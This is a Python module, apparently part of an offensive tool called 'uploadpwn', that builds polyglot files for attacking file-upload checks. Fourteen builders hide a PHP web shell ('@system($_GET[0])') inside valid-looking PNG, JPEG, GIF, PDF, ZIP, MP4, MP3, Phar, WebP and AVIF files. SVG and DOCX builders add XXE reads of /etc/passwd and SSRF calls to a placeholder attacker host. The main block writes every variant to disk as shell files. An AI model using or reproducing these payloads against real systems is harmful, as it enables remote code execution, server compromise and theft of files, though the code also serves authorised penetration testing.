"""
polyglots.py — real polyglot file builders for uploadpwn.

Each builder returns bytes. Where applicable, the output is a *valid* image
(passes Pillow / GD `imagecreatefrom*` / `getimagesize`) with the PHP payload
hidden in an ancillary chunk that decoders skip.

Requires Pillow.
"""
import struct, zlib, io, hashlib

try:
    from PIL import Image
    _PIL = True
except ImportError:  # graceful fallback for the few builders that need PIL
    _PIL = False


DEFAULT_PHP = b'<?php @system($_GET[0]);?>'


# ── primitive helpers ────────────────────────────────────────────────────
def _png_chunk(tag: bytes, data: bytes) -> bytes:
    return (struct.pack('>I', len(data)) + tag + data
            + struct.pack('>I', zlib.crc32(tag + data) & 0xffffffff))


def _jpeg_seg(marker: int, payload: bytes) -> bytes:
    return struct.pack('>HH', marker, len(payload) + 2) + payload


def _isobmff_box(tag: bytes, data: bytes) -> bytes:
    return struct.pack('>I', len(data) + 8) + tag + data


def _white_pixel_png() -> bytes:
    if not _PIL:
        raise RuntimeError("Pillow required")
    buf = io.BytesIO()
    Image.new('RGB', (1, 1), 'white').save(buf, 'PNG')
    return buf.getvalue()


def _white_pixel_jpeg() -> bytes:
    if not _PIL:
        raise RuntimeError("Pillow required")
    buf = io.BytesIO()
    Image.new('RGB', (1, 1), 'white').save(buf, 'JPEG', quality=90)
    return buf.getvalue()


# ── 1. PNG with PHP in tEXt chunk (passes imagecreatefrompng) ────────────
def build_png(php: bytes = DEFAULT_PHP) -> bytes:
    raw = _white_pixel_png()
    iend = raw.rfind(b'IEND') - 4
    text = _png_chunk(b'tEXt', b'Description\x00' + php)
    return raw[:iend] + text + raw[iend:]


# ── 2. JPEG with PHP in COM marker (passes imagecreatefromjpeg) ─────────
def build_jpeg_com(php: bytes = DEFAULT_PHP) -> bytes:
    raw = _white_pixel_jpeg()
    com = _jpeg_seg(0xFFFE, php)
    return raw[:2] + com + raw[2:]


# ── 3. JPEG EXIF UserComment (survives many strict checks) ──────────────
def build_jpeg_exif(php: bytes = DEFAULT_PHP) -> bytes:
    # Manual minimal APP1/EXIF (no piexif dependency)
    tiff = b'II*\x00' + struct.pack('<I', 8)
    tiff += struct.pack('<H', 1)
    tiff += struct.pack('<HHII', 0x8769, 4, 1, 26)
    tiff += struct.pack('<I', 0)
    sub = struct.pack('<H', 1) + struct.pack('<HHII', 0x9286, 7, len(php) + 8, 0)
    sub += b'ASCII\x00\x00\x00' + php
    app1 = b'Exif\x00\x00' + tiff + sub
    raw = _white_pixel_jpeg()
    return raw[:2] + _jpeg_seg(0xFFE1, app1) + raw[2:]


# ── 4. JPEG ICC profile chunk (decoder ignores ICC data) ───────────────
def build_jpeg_icc(php: bytes = DEFAULT_PHP) -> bytes:
    icc = b'ICC_PROFILE\x00\x01\x01' + b'\x00' * 4 + b'lcms' + php.ljust(128, b'\x00')
    raw = _white_pixel_jpeg()
    return raw[:2] + _jpeg_seg(0xFFE2, icc) + raw[2:]


# ── 5. GIF89a with PHP in comment extension (passes getimagesize) ──────
def build_gif(php: bytes = DEFAULT_PHP) -> bytes:
    hdr = b'GIF89a' + struct.pack('<HH', 1, 1) + b'\x00\x00\x00'
    # comment extension: 21 FE <len> <data...> 00
    comment = b'\x21\xFE'
    # split into 255-byte sub-blocks
    remaining = php
    while remaining:
        chunk, remaining = remaining[:255], remaining[255:]
        comment += bytes([len(chunk)]) + chunk
    comment += b'\x00'
    img = b'\x2C' + struct.pack('<HHHH', 0, 0, 1, 1) + b'\x00'
    img += b'\x02\x02\x44\x01\x00'
    return hdr + comment + img + b'\x3B'


# ── 6. PDF + PHP polyglot ───────────────────────────────────────────────
def build_pdf(php: bytes = DEFAULT_PHP) -> bytes:
    head = b'%PDF-1.4\n%' + php + b'\n'
    obj = (b'1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n'
           b'2 0 obj<</Type/Pages/Count 0/Kids[]>>endobj\n')
    xref_off = len(head) + len(obj)
    xref = b'xref\n0 3\n0000000000 65535 f \n'
    xref += (b'%010d 00000 n \n' % len(head))
    xref += (b'%010d 00000 n \n' % (len(head) + 46))
    trailer = (b'trailer<</Size 3/Root 1 0 R>>\nstartxref\n'
               + str(xref_off).encode() + b'\n%%EOF')
    return head + obj + xref + trailer


# ── 7. ZIP with shell.php at start AND in central directory ─────────────
def build_zip_php(php: bytes = DEFAULT_PHP) -> bytes:
    import zipfile
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_STORED) as z:
        z.writestr('shell.php', php)
    return php + buf.getvalue()


# ── 8. SVG kitchen-sink (XXE + XInclude + SSRF + JS + foreignObject) ───
def build_svg(php: bytes = DEFAULT_PHP, xxe_path: str = "/etc/passwd",
              ssrf_url: str = "http://attacker/x") -> bytes:
    return (
        b'<?xml version="1.0"?>\n'
        b'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file://' + xxe_path.encode() + b'">]>\n'
        b'<?xml-stylesheet href="' + ssrf_url.encode() + b'/x.xsl"?>\n'
        b'<svg xmlns="http://www.w3.org/2000/svg" '
        b'xmlns:xlink="http://www.w3.org/1999/xlink" '
        b'xmlns:xi="http://www.w3.org/2001/XInclude" width="1" height="1">'
        b'<xi:include href="file://' + xxe_path.encode() + b'" parse="text"/>'
        b'<image href="file://' + xxe_path.encode() + b'"/>'
        b'<use href="' + ssrf_url.encode() + b'"/>'
        b'<style>@import "' + ssrf_url.encode() + b'/x.css";</style>'
        b'<script type="text/javascript">fetch("' + ssrf_url.encode() + b'")</script>'
        b'<foreignObject width="1" height="1">'
        b'<body xmlns="http://www.w3.org/1999/xhtml">&xxe;</body>'
        b'</foreignObject></svg>'
    )


# ── 9. DOCX with XXE in document.xml ────────────────────────────────────
def build_docx_xxe(ssrf_url: str = "http://attacker/x") -> bytes:
    import zipfile
    ct = (b'<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
          b'<Default Extension="xml" ContentType="application/xml"/>'
          b'<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
          b'</Types>')
    rels = (b'<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            b'<Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
            b'Target="word/document.xml"/></Relationships>')
    doc = (b'<?xml version="1.0"?>\n'
           b'<!DOCTYPE w:document [<!ENTITY xxe SYSTEM "' + ssrf_url.encode() + b'">]>\n'
           b'<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
           b'<w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body></w:document>')
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
        z.writestr('[Content_Types].xml', ct)
        z.writestr('_rels/.rels', rels)
        z.writestr('word/document.xml', doc)
    return buf.getvalue()


# ── 10. MP4 with PHP smuggled into udta atom ────────────────────────────
def build_mp4(php: bytes = DEFAULT_PHP) -> bytes:
    ftyp = _isobmff_box(b'ftyp', b'isom\x00\x00\x02\x00isomiso2mp41')
    udta = _isobmff_box(b'udta', _isobmff_box(b'\xa9cmt', php))
    moov = _isobmff_box(b'moov', udta)
    return ftyp + moov


# ── 11. MP3 with PHP in ID3v2 TXXX frame ───────────────────────────────
def _id3_syncsafe(n: int) -> bytes:
    return bytes([(n >> 21) & 0x7f, (n >> 14) & 0x7f, (n >> 7) & 0x7f, n & 0x7f])


def build_mp3(php: bytes = DEFAULT_PHP) -> bytes:
    body = b'\x03' + b'shell\x00' + php
    frame = b'TXXX' + struct.pack('>I', len(body)) + b'\x00\x00' + body
    hdr = b'ID3\x04\x00\x00' + _id3_syncsafe(len(frame))
    mpeg = b'\xff\xfb\x90\x00' + b'\x00' * 32
    return hdr + frame + mpeg


# ── 12. Phar masquerading as JPEG ───────────────────────────────────────
def build_phar_jpeg(php: bytes = DEFAULT_PHP) -> bytes:
    stub = b'<?php __HALT_COMPILER(); ?>\r\n'
    alias, metadata = b'', b''
    manifest = struct.pack('<I', 0)
    manifest += struct.pack('<H', 0x1100)
    manifest += struct.pack('<I', 0)
    manifest += struct.pack('<I', len(alias)) + alias
    manifest += struct.pack('<I', len(metadata)) + metadata
    body = stub + struct.pack('<I', len(manifest)) + manifest
    sha1 = hashlib.sha1(body).digest()
    phar = body + sha1 + struct.pack('<I', 0x0002) + b'GBMB'
    jpeg_shell = b'\xff\xd8\xff\xfe' + struct.pack('>H', len(php) + 2) + php
    return jpeg_shell + phar


# ── 13. WebP RIFF with PHP in custom chunk ─────────────────────────────
def build_webp(php: bytes = DEFAULT_PHP) -> bytes:
    vp8l = b'VP8L' + struct.pack('<I', 10) + b'\x2f\x00\x00\x00\x00\x88\x88\x08\x07\x10'
    pad = b'\x00' if len(php) % 2 else b''
    xphp = b'XPHP' + struct.pack('<I', len(php)) + php + pad
    body = b'WEBP' + vp8l + xphp
    return b'RIFF' + struct.pack('<I', len(body)) + body


# ── 14. AVIF/HEIC ISOBMFF mdat smuggle ─────────────────────────────────
def build_avif(php: bytes = DEFAULT_PHP) -> bytes:
    ftyp = _isobmff_box(b'ftyp', b'avif\x00\x00\x00\x00avifmif1miaf')
    mdat = _isobmff_box(b'mdat', php)
    meta = _isobmff_box(b'meta', b'\x00\x00\x00\x00'
                        + _isobmff_box(b'hdlr', b'\x00' * 4 + b'pict' + b'\x00' * 12))
    return ftyp + meta + mdat


BUILDERS = {
    'png':      build_png,
    'jpg_com':  build_jpeg_com,
    'jpg_exif': build_jpeg_exif,
    'jpg_icc':  build_jpeg_icc,
    'gif':      build_gif,
    'pdf':      build_pdf,
    'zip':      build_zip_php,
    'svg':      build_svg,
    'docx':     build_docx_xxe,
    'mp4':      build_mp4,
    'mp3':      build_mp3,
    'phar_jpg': build_phar_jpeg,
    'webp':     build_webp,
    'avif':     build_avif,
}


if __name__ == '__main__':
    import os
    os.makedirs('out', exist_ok=True)
    for name, fn in BUILDERS.items():
        path = f'out/shell_{name}.bin'
        try:
            data = fn() if name not in ('docx',) else fn()
            open(path, 'wb').write(data)
            print(f'[+] {path} ({len(data)} B)')
        except Exception as e:
            print(f'[-] {name}: {e}')
